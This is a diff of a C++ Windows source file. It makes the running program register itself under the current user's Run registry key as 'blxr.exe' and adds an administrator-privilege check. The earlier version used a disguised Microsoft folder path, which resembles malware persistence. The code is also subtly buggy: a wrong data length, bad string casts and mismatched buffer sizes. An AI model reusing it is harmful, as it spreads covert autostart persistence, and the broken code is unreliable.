@@ -1,31 +1,58 @@
 #include "sys.h"
 #include "stream.h"
 
-int sys::AddToRegistry(const std::string &name) {
-  std::string win_path = stream::GetPath(R"(\Microsoft\Windows\blxr\)");
-  std::wstring w_win_path = std::wstring(win_path.begin(), win_path.end());
-  std::wstring w_name = std::wstring(name.begin(), name.end());
+int Sys::AddToRegistry() {
+  std::wstring exe = L"blxr.exe";
+  std::wstring fullPath;
+  WCHAR dest[0xFFF];
+  GetModuleFileNameW(nullptr, dest, MAX_PATH);
 
-  std::string full_path = win_path + name + ".exe";
   HKEY hkey = nullptr;
-  LSTATUS ret_rck = RegCreateKeyEx(HKEY_CURRENT_USER,
-								   reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
-								   0,
-								   nullptr,
-								   REG_OPTION_NON_VOLATILE,
-								   KEY_SET_VALUE,
-								   nullptr,
-								   &hkey,
-								   nullptr);
-  if (ret_rck!=ERROR_SUCCESS) {
-	return ret_rck;
+  LSTATUS retRck = RegCreateKeyEx(HKEY_CURRENT_USER,
+								  reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+								  0,
+								  nullptr,
+								  REG_OPTION_NON_VOLATILE,
+								  KEY_SET_VALUE,
+								  nullptr,
+								  &hkey,
+								  nullptr);
+  if (retRck != ERROR_SUCCESS) {
+	return retRck;
   }
   RegSetValueEx(hkey,
-				reinterpret_cast<LPCSTR>(w_name.c_str()),
+				reinterpret_cast<LPCSTR>(exe.c_str()),
 				0,
 				REG_SZ,
-				(BYTE *)full_path.c_str(),
-				(full_path.size() + 1)*sizeof(wchar_t));
-  //RegQueryValueEx(hkey, full_path.c_str(), nullptr, nullptr, nullptr, nullptr);
+				(BYTE *)dest,
+				(fullPath.size() + 1) * sizeof(wchar_t));
+  //RegQueryValueEx(hkey, fullPath.c_str(), nullptr, nullptr, nullptr, nullptr);
   return 0;
+}
+bool Sys::IsRunningAsAdmin() {
+  BOOL isAdmin = false;
+  DWORD dwError = ERROR_SUCCESS;
+  PSID pAdministratorsGroup;
+
+  SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+  if (!AllocateAndInitializeSid(
+	  &ntAuthority,
+	  2,
+	  SECURITY_BUILTIN_DOMAIN_RID,
+	  DOMAIN_ALIAS_RID_ADMINS,
+	  0, 0, 0, 0, 0, 0,
+	  &pAdministratorsGroup)) {
+	dwError = GetLastError();
+  } else if (!CheckTokenMembership(nullptr, pAdministratorsGroup, &isAdmin)) {
+	dwError = GetLastError();
+  }
+
+  if (pAdministratorsGroup) {
+	FreeSid(pAdministratorsGroup);
+	pAdministratorsGroup = nullptr;
+  }
+  if (ERROR_SUCCESS != dwError) {
+	throw dwError;
+  }
+  return isAdmin;
 }
